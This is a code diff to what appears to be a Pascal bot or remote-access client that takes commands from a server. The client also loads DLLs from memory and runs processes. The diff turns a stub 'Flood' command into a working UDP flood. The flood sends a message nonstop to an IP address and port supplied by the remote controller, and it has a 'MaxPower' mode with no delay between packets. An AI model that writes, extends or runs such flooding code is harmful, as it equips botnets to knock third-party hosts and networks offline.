@@ -7,7 +7,7 @@ interface
 uses
   NetModule, Tools,
   Classes, SysUtils, IdMultipartFormData, Process, IdHTTP, WExecFromMem,
-  BTMemoryModule;
+  BTMemoryModule, IdUDPClient;
 
 type
   TCmdWorker = class(TThread)
@@ -121,6 +121,9 @@ var
 
   MemDLLData: Pointer;
   MemDLLModule: PBTMemoryModule;
+
+  UP: TIdUDPClient;
+  SMessage: String;
 
   procedure DoPost;
   Begin
@@ -287,12 +290,24 @@ Begin
     end;
     'Flood': Begin
       ToPost.AddFormField('RT', '1');
-      ToPost.AddFormField('Result', 'This is going to take a long time!');
-      //DoPost;
-      While Not(Terminated) do Begin
-        //Doing some stuff
+      UP:=TIdUDPClient.Create(Nil);
+      UP.Host:=Net.Commands.ReadString(FCmdID, 'IPAddress',
+        Settings.ReadString('Flood', 'DefaultIP', '1.1.1.1'));
+      UP.Port:=Net.Commands.ReadInt64(FCmdID, 'Port',
+        Settings.ReadInt64('Flood', 'Port', 80));
+      SMessage:=Settings.ReadString('Flood', 'Message', 'A cat is fine too. Desudesudesu~');
+      if Settings.ReadBool('Flood', 'MaxPower', True) then Begin
+        While Not(Terminated) do Begin
+          UP.Send(SMessage);
+        end;
+      end else Begin
+        While Not(Terminated) do Begin
+          UP.Send(SMessage);
+          Sleep(1);
+        end;
       end;
-      ToPost.AddFormField('Result', 'All done!');
+      UP.Free;
+      ToPost.AddFormField('Result', 'Flood over!');
       DoPost;
     end;
     'Ping': Begin
